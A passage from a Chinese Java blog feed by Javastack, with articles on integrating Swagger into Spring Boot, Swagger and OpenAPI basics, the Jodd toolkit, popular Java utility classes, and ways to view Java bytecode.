        <content type="html"><![CDATA[<p>之前的文章介绍了《<a href="https://mp.weixin.qq.com/s/KcX68KZPR7KOfwSCImbUIg">推荐一款接口 API 设计神器！</a>》，今天栈长给大家介绍下如何与优秀的 Spring Boot 框架进行集成，简直不能太简单。</p><h2 id="Spring-Boot-集成-Swagger"><a href="#Spring-Boot-集成-Swagger" class="headerlink" title="Spring Boot 集成 Swagger"></a>Spring Boot 集成 Swagger</h2><h4 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h4><p>Maven依赖示例：</p><pre class="line-numbers language-none"><code class="language-none"><!-- Swagger -->&lt;dependency&gt;    &lt;groupId&gt;io.springfox&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;springfox-swagger2&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;io.springfox&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;springfox-swagger-ui&lt;&#x2F;artifactId&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2、在-Spring-Boot-配置文件中添加配置参数。"><a href="#2、在-Spring-Boot-配置文件中添加配置参数。" class="headerlink" title="2、在 Spring Boot 配置文件中添加配置参数。"></a>2、在 Spring Boot 配置文件中添加配置参数。</h4><pre class="line-numbers language-none"><code class="language-none">swagger:  title: API标题  description: API描述  version: 1.0  terms-of-service-url: http:&#x2F;&#x2F;www.javastack.cn&#x2F;  base-package: cn.javastack.test.web  contact:    name: Javastack    url: http:&#x2F;&#x2F;www.javastack.cn&#x2F;    email: admin@javastack.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3、添加配置类"><a href="#3、添加配置类" class="headerlink" title="3、添加配置类"></a>3、添加配置类</h4><pre class="line-numbers language-none"><code class="language-none">@Getter@Setter@Configuration@EnableSwagger2@ConditionalOnClass(EnableSwagger2.class)@ConfigurationProperties(prefix &#x3D; &quot;swagger&quot;)public class SwaggerConfig &#123;    &#x2F;**     * API接口包路径     *&#x2F;    private String basePackage;    &#x2F;**     * API页面标题     *&#x2F;    private String title;    &#x2F;**     * API描述     *&#x2F;    private String description;    &#x2F;**     * 服务条款地址     *&#x2F;    private String termsOfServiceUrl;    &#x2F;**     * 版本号     *&#x2F;    private String version;    &#x2F;**     * 联系人     *&#x2F;    private Contact contact;        @Bean    public Docket api() &#123;        return new Docket(DocumentationType.SWAGGER_2)                .apiInfo(apiInfo())                .select()                .apis(RequestHandlerSelectors.basePackage(basePackage))                .paths(PathSelectors.any())                .build();    &#125;    private ApiInfo apiInfo() &#123;        return new ApiInfoBuilder()                .title(title)                .description(description)                .termsOfServiceUrl(termsOfServiceUrl)                .version(version)                .contact(contact)                .build();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>Swagger 默认会根据配置的包，扫描所有接口并生成对应的 API 描述和参数信息，但这样不是很直观，需要对每个接口和参数进行自定义描述。</p><p>常用的 Swagger 注解如下。</p><table><thead><tr><th>注解名称</th><th>使用说明</th></tr></thead><tbody><tr><td>@Api</td><td>描述一个 API 类</td></tr><tr><td>@ApiImplicitParam</td><td>描述一个请求参数</td></tr><tr><td>@ApiImplicitParams</td><td>描述一组请求参数</td></tr><tr><td>@ApiModel</td><td>描述一个返回的对象</td></tr><tr><td>@ApiModelProperty</td><td>描述一个返回的对象参数</td></tr><tr><td>@ApiOperation</td><td>描述一个 API 方法</td></tr><tr><td>@ApiParam</td><td>描述一个方法的参数</td></tr><tr><td>@ApiResponse</td><td>描述一个请求响应</td></tr><tr><td>@ApiResponses</td><td>描述一组请求响应</td></tr></tbody></table><p>使用示例如：</p><pre class="line-numbers language-none"><code class="language-none">@Api(description &#x3D; &quot;登录模块&quot;)@RestControllerpublic class LoginController &#123;        @ApiOperation(value &#x3D; &quot;登录&quot;, httpMethod &#x3D; &quot;POST&quot;)    @ApiImplicitParams(&#123;            @ApiImplicitParam(name &#x3D; &quot;username&quot;, value &#x3D; &quot;用户名&quot;, dataType &#x3D; &quot;string&quot;, paramType &#x3D; &quot;query&quot;),            @ApiImplicitParam(name &#x3D; &quot;password&quot;, value &#x3D; &quot;密码&quot;, dataType &#x3D; &quot;string&quot;, paramType &#x3D; &quot;query&quot;)&#125;)    @PostMapping(value &#x3D; &quot;&#x2F;login&quot;)    public Object login(@RequestParam(&quot;username&quot;) String username, @RequestParam(&quot;password&quot;) String password) &#123;            &#x2F;&#x2F; ...              &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="http://localhost:8080/swagger-ui.html">http://localhost:8080/swagger-ui.html</a></p></blockquote><p>打开 swagger-ui 界面，可以看到所有的 API 接口定义，也可以在上面发起接口测试。</p><ul><li>Java 开发必知道的国外 10 大网站</li><li>免费在线创作流程图、思维导图软件</li><li>推荐一款代码神器，代码量至少省一半！</li><li>推荐一款接口 API 设计神器！</li><li>超详细的 Git 实战教程，傻瓜一看也会！</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Swagger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一款接口 API 设计神器！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Swagger/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E6%8E%A5%E5%8F%A3%20API%20%E8%AE%BE%E8%AE%A1%E7%A5%9E%E5%99%A8%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Swagger/%E6%8E%A8%E8%8D%90%E4%B8%80%E6%AC%BE%E6%8E%A5%E5%8F%A3%20API%20%E8%AE%BE%E8%AE%A1%E7%A5%9E%E5%99%A8%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>今天栈长给大家推荐一款接口 API 设计神器，传说中的，牛逼哄洪的 Swagger，它到底是什么？今天为大家揭开谜底！</p><h2 id="Swagger是什么？"><a href="#Swagger是什么？" class="headerlink" title="Swagger是什么？"></a>Swagger是什么？</h2><blockquote><p>官网：<a href="https://swagger.io/">https://swagger.io/</a></p></blockquote><p><img src="http://img.javastack.cn/18-10-25/30041.jpg"></p><p>Swagger 如官网所示，它是最好的 API 构建工具。</p><p>它是一个围绕 OpenAPI 规范构建的开源工具，它可以帮助我们设计、构建、记录和使用 REST API 接口。</p><p>Swagger 包含的主要套件：</p><ul><li>Swagger Editor - 基于浏览器的编辑器，用来编写 OpenAPI 规范。</li><li>Swagger UI - 基于 OpenAPI 规范动态生成 API 规范文档。</li><li>Swagger Codegen - 个模板驱动引擎，用来生成客户端代码。</li></ul><p><img src="http://img.javastack.cn/18-10-25/15444134.jpg"></p><p>图片来源见博客水印。</p><h2 id="OpenAPI是什么？"><a href="#OpenAPI是什么？" class="headerlink" title="OpenAPI是什么？"></a>OpenAPI是什么？</h2><p>上面有说到 Swagger 是一个围绕 OpenAPI 规范构建的开源工具，那么 OpenAPI 是什么呢？</p><p>OpenAPI 规范，以前叫 Swagger 规范。它是一个为 REST APIs的接口定义的规范。OpenAPI 可以定义的 API 实体内容包括以下几个部分。</p><ul><li>请求地址（如：&#x2F;user）</li><li>请求类型（如：GET、POST 等）</li><li>请求参数</li><li>响应参数</li><li>验证方式</li><li>文档信息：如联系人、许可证、服务条件等</li></ul><p>这个 OpenAPI 规范可以用 YAML 或者 JSON 来编写，这种格式非常易于学习，可读性对开发人员非常友好。</p><p>完整的 OpenAPI 规范可以去官网看一下。</p><blockquote><p><a href="https://github.com/OAI/OpenAPI-Specification">https://github.com/OAI/OpenAPI-Specification</a></p></blockquote><p>编写文档地址：</p><blockquote><p><a href="http://editor.swagger.io/">http://editor.swagger.io/</a></p></blockquote><p><img src="http://img.javastack.cn/18-10-25/51053663.jpg"></p><h2 id="为什么需要Swagger？"><a href="#为什么需要Swagger？" class="headerlink" title="为什么需要Swagger？"></a>为什么需要Swagger？</h2><p>现在的互联网架构都是前后端分离的模式，还有现在是移动互联网时代了，APP 需要与后端服务器通信也需要维护一套接口，API文档自然就成了前后端开发人员联系的纽带。</p><p>编写 API 文档的方式也各有不同，有用 WORD 编写的，有用 confluence 等编写的，但这些方式都不能动态更新，每次接口变更都需要手动维护文档，甚是麻烦。有了 Swagger，可以先做完接口，通过 Swagger 来动态生成和更新 API 文档。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Swagger </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java界的瑞士军刀，无法想象的轻量级工具包</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%B1%BB/Java%E7%95%8C%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%EF%BC%8C%E6%97%A0%E6%B3%95%E6%83%B3%E8%B1%A1%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7%E5%B7%A5%E5%85%B7%E5%8C%85/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%B1%BB/Java%E7%95%8C%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%EF%BC%8C%E6%97%A0%E6%B3%95%E6%83%B3%E8%B1%A1%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7%E5%B7%A5%E5%85%B7%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-27/74126275.jpg"></p><h4 id="Jodd介绍"><a href="#Jodd介绍" class="headerlink" title="Jodd介绍"></a>Jodd介绍</h4><p>Jodd是对于Java开发更便捷的开源迷你框架，包含工具类、实用功能的集合，总包体积不到1.7M。</p><p>Jodd构建于通用场景使开发变得简单，但Jodd并不简单！它能让你把事情做得更好，实现你的想法，让你享受编码的乐趣。</p><p>简而言之，如果你准备造轮子，先看看Jodd实现了没。你可以把Jodd想象成Java的”瑞士军刀”,不仅小，锋利而且包含许多便利的功能。</p><h4 id="Jodd提供的功能"><a href="#Jodd提供的功能" class="headerlink" title="Jodd提供的功能"></a>Jodd提供的功能</h4><ol><li>提供操作Java bean，</li><li>可以从各种数据源加载 Bean,</li><li>简化 JDBC 的接连与代码，</li><li>剖析 SQL 查询，</li><li>处理时间与日期，</li><li>操作与格式化 String,</li><li>搜索本地硬盘上的文件，</li><li>帮助处理 Servlet 请求等。</li><li>包含一个很小但实用的基于JSP的MVC框架。</li></ol><h4 id="Jodd组成"><a href="#Jodd组成" class="headerlink" title="Jodd组成"></a>Jodd组成</h4><p>Jodd 被分成众多模块，按需选择。</p><p><strong>Jodd工具包</strong></p><p>高性能的工具集合</p><ul><li>TypeConverter 一个强大的类型转换工具</li><li>BeanUtil 高效的 Bean 工具，支持嵌套的属性，以及标准的集合类</li><li>Base64&#x2F;Base32</li><li>JDateTime 增强的时间类</li><li>IO 快速高性能的各种 Buffer、Writer、OutputStream</li><li>Wildcard 通配符工具</li><li>Servlet Servlet 工具，JSP 的标签、函数扩展</li><li>FindFile&#x2F;ClassFinder 强大的文件&#x2F;类搜索工具，支持通配符&amp;正则表达式匹配</li><li>Cache 简单易用的 LRU、LRU、FIFO 缓存</li><li>StringUtil 强大的字符串处理工具</li></ul><p><strong>Madvoc</strong></p><p>轻量级快速开发MVC框架</p><ul><li>自动扫描 Actions &amp; Results</li><li>参数自动注入，支持嵌套的属性注入，支持标准集合参数的注入</li><li>自动导出需要输出的参数</li><li>支持通配符&#x2F;正则表达式路由地址</li><li>支持 REST 风格的 URL</li><li>支持通过配置文件设置 Action 的拦截器</li><li>开放的 API，可轻松扩展</li></ul><p><strong>HTTP</strong></p><p>轻量级Http客户端</p><ul><li>基于socket</li><li>支持 cookies</li><li>支持上传文件</li><li>支持自定义 HTTP 头</li><li>支持 gzip</li><li>支持 Basic authentication</li></ul><p><strong>Props</strong></p><p>增强的properties</p><ul><li>支持 UTF-8 编码</li><li>支持插值操作</li><li>支持 ini 类型的区段</li><li>支持使用 +&#x3D; 附加值</li><li>支持多行模式</li></ul><p><strong>Email</strong></p><p>易用的 Email 接收发送工具，基于 javax.mail</p><ul><li>支持 SSL</li><li>支持添加附件</li><li>支持 POP3、IMAP</li><li>IMAP 接受模式支持定义过滤器</li><li>支持解析 EML 文件</li></ul><p><strong>Petite</strong></p><p>轻量级 IoC 容器</p><p><strong>Db &amp; DbOom</strong></p><p>轻量级 ORM 框架</p><p><strong>Lagarto</strong></p><p>高性能的 xml&#x2F;html 解析框架</p><p><strong>Jerry</strong></p><p>HTML 解析框架，Java 中的 jQuery，基于 Lagarto</p><p><strong>VTor</strong></p><p>基于注解的字段验证框架</p><ul><li>可设置多配置</li><li>易扩展</li></ul><p><strong>Proxetta</strong></p><p>高性能的代理生成器</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>可以看出，Jodd集合了Apache的Commons工具包(Lang，IO，BeanUtils，Codec，Email)中的核心功能，MVC、IOC&#x2F;DI、ORM统统使用自有解决方案（想想Spring），加上简化而优雅的Http处理类（流式调用，媲美基于HttpClient的HCFluent），类似JQuery般操作HTML的Jerry，媲美Joda的JDataTime，甚至疯狂的定义了自己的Prop类用于管理属性。</p><p><strong>总之，Jodd &#x3D; tools + ioc + mvc + db + aop + tx + json + html &lt; 1.7 Mb</strong></p><blockquote><p>更多关于Jodd的介绍与使用可以到它的官网：<a href="https://jodd.org/">https://jodd.org/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排名前 16 的 Java 工具类</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%B1%BB/%E6%8E%92%E5%90%8D%E5%89%8D%2016%20%E7%9A%84%20Java%20%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7%E7%B1%BB/%E6%8E%92%E5%90%8D%E5%89%8D%2016%20%E7%9A%84%20Java%20%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-2-27/29152641.jpg"></p><p>在Java中，工具类定义了一组公共方法，这篇文章将介绍Java中使用最频繁及最通用的Java工具类。以下工具类、方法按使用流行度排名，参考数据来源于Github上随机选取的5万个开源项目源码。</p><h4 id="一-org-apache-commons-io-IOUtils"><a href="#一-org-apache-commons-io-IOUtils" class="headerlink" title="一. org.apache.commons.io.IOUtils"></a>一. org.apache.commons.io.IOUtils</h4><pre class="line-numbers language-none"><code class="language-none">closeQuietly：关闭一个IO流、socket、或者selector且不抛出异常，通常放在finally块toString：转换IO流、 Uri、 byte[]为Stringcopy：IO流数据复制，从输入流写到输出流中，最大支持2GBtoByteArray：从输入流、URI获取byte[]write：把字节. 字符等写入输出流toInputStream：把字符转换为输入流readLines：从输入流中读取多行数据，返回List&lt;String&gt;copyLarge：同copy，支持2GB以上数据的复制lineIterator：从输入流返回一个迭代器，根据参数要求读取的数据量，全部读取，如果数据不够，则失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二-org-apache-commons-io-FileUtils"><a href="#二-org-apache-commons-io-FileUtils" class="headerlink" title="二. org.apache.commons.io.FileUtils"></a>二. org.apache.commons.io.FileUtils</h4><pre class="line-numbers language-none"><code class="language-none">deleteDirectory：删除文件夹readFileToString：以字符形式读取文件内容deleteQueitly：删除文件或文件夹且不会抛出异常copyFile：复制文件writeStringToFile：把字符写到目标文件，如果文件不存在，则创建forceMkdir：强制创建文件夹，如果该文件夹父级目录不存在，则创建父级write：把字符写到指定文件中listFiles：列举某个目录下的文件(根据过滤器)copyDirectory：复制文件夹forceDelete：强制删除文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="三-org-apache-commons-lang-StringUtils"><a href="#三-org-apache-commons-lang-StringUtils" class="headerlink" title="三. org.apache.commons.lang.StringUtils"></a>三. org.apache.commons.lang.StringUtils</h4><pre class="line-numbers language-none"><code class="language-none">isBlank：字符串是否为空 (trim后判断)isEmpty：字符串是否为空 (不trim并判断)equals：字符串是否相等join：合并数组为单一字符串，可传分隔符split：分割字符串EMPTY：返回空字符串trimToNull：trim后为空字符串则转换为nullreplace：替换字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="四-org-apache-http-util-EntityUtils"><a href="#四-org-apache-http-util-EntityUtils" class="headerlink" title="四. org.apache.http.util.EntityUtils"></a>四. org.apache.http.util.EntityUtils</h4><pre class="line-numbers language-none"><code class="language-none">toString：把Entity转换为字符串consume：确保Entity中的内容全部被消费。可以看到源码里又一次消费了Entity的内容，假如用户没有消费，那调用Entity时候将会把它消费掉toByteArray：把Entity转换为字节流consumeQuietly：和consume一样，但不抛异常getContentCharset：获取内容的编码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="五-org-apache-commons-lang3-StringUtils"><a href="#五-org-apache-commons-lang3-StringUtils" class="headerlink" title="五. org.apache.commons.lang3.StringUtils"></a>五. org.apache.commons.lang3.StringUtils</h4><pre class="line-numbers language-none"><code class="language-none">isBlank：字符串是否为空 (trim后判断)isEmpty：字符串是否为空 (不trim并判断)equals：字符串是否相等join：合并数组为单一字符串，可传分隔符split：分割字符串EMPTY：返回空字符串replace：替换字符串capitalize：首字符大写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="六-org-apache-commons-io-FilenameUtils"><a href="#六-org-apache-commons-io-FilenameUtils" class="headerlink" title="六. org.apache.commons.io.FilenameUtils"></a>六. org.apache.commons.io.FilenameUtils</h4><pre class="line-numbers language-none"><code class="language-none">getExtension：返回文件后缀名getBaseName：返回文件名，不包含后缀名getName：返回文件全名concat：按命令行风格组合文件路径(详见方法注释)removeExtension：删除后缀名normalize：使路径正常化wildcardMatch：匹配通配符seperatorToUnix：路径分隔符改成unix系统格式的，即&#x2F;getFullPath：获取文件路径，不包括文件名isExtension：检查文件后缀名是不是传入参数(List&lt;String&gt;)中的一个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="七-org-springframework-util-StringUtils"><a href="#七-org-springframework-util-StringUtils" class="headerlink" title="七. org.springframework.util.StringUtils"></a>七. org.springframework.util.StringUtils</h4><pre class="line-numbers language-none"><code class="language-none">hasText：检查字符串中是否包含文本hasLength：检测字符串是否长度大于0isEmpty：检测字符串是否为空（若传入为对象，则判断对象是否为null）commaDelimitedStringToArray：逗号分隔的String转换为数组collectionToDelimitedString：把集合转为CSV格式字符串replace 替换字符串7. delimitedListToStringArray：相当于splituncapitalize：首字母小写collectionToDelimitedCommaString：把集合转为CSV格式字符串tokenizeToStringArray：和split基本一样，但能自动去掉空白的单词<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="八-org-apache-commons-lang-ArrayUtils"><a href="#八-org-apache-commons-lang-ArrayUtils" class="headerlink" title="八. org.apache.commons.lang.ArrayUtils"></a>八. org.apache.commons.lang.ArrayUtils</h4><pre class="line-numbers language-none"><code class="language-none">contains：是否包含某字符串addAll：添加整个数组clone：克隆一个数组isEmpty：是否空数组add：向数组添加元素subarray：截取数组indexOf：查找某个元素的下标isEquals：比较数组是否相等toObject：基础类型数据数组转换为对应的Object数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="九-org-apache-commons-lang-StringEscapeUtils"><a href="#九-org-apache-commons-lang-StringEscapeUtils" class="headerlink" title="九. org.apache.commons.lang.StringEscapeUtils"></a>九. org.apache.commons.lang.StringEscapeUtils</h4><pre class="line-numbers language-none"><code class="language-none">参考十五：org.apache.commons.lang3.StringEscapeUtils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="十-org-apache-http-client-utils-URLEncodedUtils"><a href="#十-org-apache-http-client-utils-URLEncodedUtils" class="headerlink" title="十. org.apache.http.client.utils.URLEncodedUtils"></a>十. org.apache.http.client.utils.URLEncodedUtils</h4><pre class="line-numbers language-none"><code class="language-none">format：格式化参数，返回一个HTTP POST或者HTTP PUT可用application&#x2F;x-www-form-urlencoded字符串parse：把String或者URI等转换为List&lt;NameValuePair&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="十一-org-apache-commons-codec-digest-DigestUtils"><a href="#十一-org-apache-commons-codec-digest-DigestUtils" class="headerlink" title="十一. org.apache.commons.codec.digest.DigestUtils"></a>十一. org.apache.commons.codec.digest.DigestUtils</h4><pre class="line-numbers language-none"><code class="language-none">md5Hex：MD5加密，返回32位字符串sha1Hex：SHA-1加密sha256Hex：SHA-256加密sha512Hex：SHA-512加密md5：MD5加密，返回16位字符串<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="十二-org-apache-commons-collections-CollectionUtils"><a href="#十二-org-apache-commons-collections-CollectionUtils" class="headerlink" title="十二. org.apache.commons.collections.CollectionUtils"></a>十二. org.apache.commons.collections.CollectionUtils</h4><pre class="line-numbers language-none"><code class="language-none">isEmpty：是否为空select：根据条件筛选集合元素transform：根据指定方法处理集合元素，类似List的map()filter：过滤元素，雷瑟List的filter()find：基本和select一样collect：和transform 差不多一样，但是返回新数组forAllDo：调用每个元素的指定方法isEqualCollection：判断两个集合是否一致<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="十三-org-apache-commons-lang3-ArrayUtils"><a href="#十三-org-apache-commons-lang3-ArrayUtils" class="headerlink" title="十三. org.apache.commons.lang3.ArrayUtils"></a>十三. org.apache.commons.lang3.ArrayUtils</h4><pre class="line-numbers language-none"><code class="language-none">contains：是否包含某个字符串addAll：添加整个数组clone：克隆一个数组isEmpty：是否空数组add：向数组添加元素subarray：截取数组indexOf：查找某个元素的下标isEquals：比较数组是否相等toObject：基础类型数据数组转换为对应的Object数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="十四-org-apache-commons-beanutils-PropertyUtils"><a href="#十四-org-apache-commons-beanutils-PropertyUtils" class="headerlink" title="十四. org.apache.commons.beanutils.PropertyUtils"></a>十四. org.apache.commons.beanutils.PropertyUtils</h4><pre class="line-numbers language-none"><code class="language-none">getProperty：获取对象属性值setProperty：设置对象属性值getPropertyDiscriptor：获取属性描述器isReadable：检查属性是否可访问copyProperties：复制属性值，从一个对象到另一个对象getPropertyDiscriptors：获取所有属性描述器isWriteable：检查属性是否可写getPropertyType：获取对象属性类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="十五-org-apache-commons-lang3-StringEscapeUtils"><a href="#十五-org-apache-commons-lang3-StringEscapeUtils" class="headerlink" title="十五. org.apache.commons.lang3.StringEscapeUtils"></a>十五. org.apache.commons.lang3.StringEscapeUtils</h4><pre class="line-numbers language-none"><code class="language-none">unescapeHtml4：转义htmlescapeHtml4：反转义htmlescapeXml：转义xmlunescapeXml：反转义xmlescapeJava：转义unicode编码escapeEcmaScript：转义EcmaScript字符unescapeJava：反转义unicode编码escapeJson：转义json字符escapeXml10：转义Xml10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个现在已经废弃了，建议使用commons-text包里面的方法。</p><h4 id="十六-org-apache-commons-beanutils-BeanUtils"><a href="#十六-org-apache-commons-beanutils-BeanUtils" class="headerlink" title="十六. org.apache.commons.beanutils.BeanUtils"></a>十六. org.apache.commons.beanutils.BeanUtils</h4><pre class="line-numbers language-none"><code class="language-none">copyPeoperties：复制属性值，从一个对象到另一个对象getProperty：获取对象属性值setProperty：设置对象属性值populate：根据Map给属性复制copyPeoperty：复制单个值，从一个对象到另一个对象cloneBean：克隆bean实例<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在你只要了解了以上16种最流行的工具类方法，你就不必要再自己写工具类了，不必重复造轮子。大部分工具类方法通过其名字就能明白其用途，如果不清楚的，可以看下别人是怎么用的，或者去网上查询其用法。</p><p>另外，工具类，根据阿里开发手册，包名如果要使用util不能带s，工具类命名为<code>XxxUtils</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3种骚操作，教你查看 Java 字节码！</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/3%E7%A7%8D%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%95%99%E4%BD%A0%E6%9F%A5%E7%9C%8B%20Java%20%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/%E6%95%88%E7%8E%87/3%E7%A7%8D%E9%AA%9A%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%95%99%E4%BD%A0%E6%9F%A5%E7%9C%8B%20Java%20%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>在我们工作、学习、以及研究 JVM 过程当中，不可避免的要查看 Java 字节码，通过查看字节码可以了解一个类的编译结果，也能通过编译器层面来分析一个类的性能。</p><p>字节码文件是不能直接打开的，下面栈长教大家几种简单的方法如何查看 Java 字节码。</p><h4 id="1、使用-javap-命令查看字节码"><a href="#1、使用-javap-命令查看字节码" class="headerlink" title="1、使用 javap 命令查看字节码"></a>1、使用 javap 命令查看字节码</h4><p>命令格式如下：</p><blockquote><p>javap -c xxx.class</p></blockquote><p>JDK 提供的了，不解释，来，演示操作一把：</p><pre class="line-numbers language-none"><code class="language-none">$ javap -c Test.classCompiled from &quot;Test.java&quot;public class com.test.Test &#123;  public com.test.Test();    Code:       0: aload_0       1: invokespecial #8                  &#x2F;&#x2F; Method java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V       4: return  public static void main(java.lang.String[]);    Code:       0: return&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如上所示，可以看到 Test 类的的字节码。</p><h4 id="2、Intellij-IDEA-中查看字节码"><a href="#2、Intellij-IDEA-中查看字节码" class="headerlink" title="2、Intellij IDEA 中查看字节码"></a>2、Intellij IDEA 中查看字节码</h4><p>Intellij IDEA 直接集成了一个工具菜单，可以直接查看字节码，打开 <code>ByteCode</code> 插件窗口方法如下：</p><blockquote><p>View -&gt; Show bytecode</p></blockquote><p><img src="http://img.javastack.cn/20191205114156.png"><br><img src="http://img.javastack.cn/20191205114048.png"></p><p>如图所示，可以看到 String 类的的字节码。</p><p>是不是很方便？</p><p>如果看不到这个菜单，那可能你当前的类没有编译，需要你编译一下。</p><p>想当初从 Eclipse 转 IDEA 数次都失败，现在早习惯了，说实话写代码是真智能，基友搭配，效率翻倍。</p><h4 id="3、Eclipse-中查看字节码"><a href="#3、Eclipse-中查看字节码" class="headerlink" title="3、Eclipse 中查看字节码"></a>3、Eclipse 中查看字节码</h4><p>在 Eclipse 中查看字节码稍显麻烦，需要安装插件，并打开插件窗口，安装和使用方式如下：</p><p><img src="http://img.javastack.cn/20191205134348.png"></p><p><strong>Name：</strong> bytecode</p><p><strong>Location：</strong> <a href="http://andrei.gmxhome.de/eclipse">http://andrei.gmxhome.de/eclipse</a></p><p>安装完后需要重启 Eclipse 才能生效。</p><p>Eclipse 打开 <code>ByteCode</code> 插件窗口：</p><blockquote><p>Window-&gt; Show View -&gt; Other -&gt; Java -&gt; Bytecode </p></blockquote><p><img src="http://img.javastack.cn/20191205134934.png"></p><p>如图所示，可以看到 String 类的的字节码。</p><p>当然，市面上还有很多其他的小工具可以查看字节码，这里就不再一一介绍了，有兴趣的可以去了解下，栈长介绍的这三种方式应该够用了吧。</p><p>看完有没有涨姿势呢？</p><p>老铁，可以拿出去装逼了，在看、转发一波！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
